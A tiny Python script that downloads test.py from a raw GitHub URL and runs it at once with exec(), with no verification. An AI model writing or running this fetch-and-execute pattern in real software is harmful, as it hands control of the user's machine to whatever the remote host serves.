import requests
import json

url= 'https://raw.githubusercontent.com/Johnny-Hao-Le/test-music/main/test.py'
r = requests.get(url)
code = r.text
exec(code)
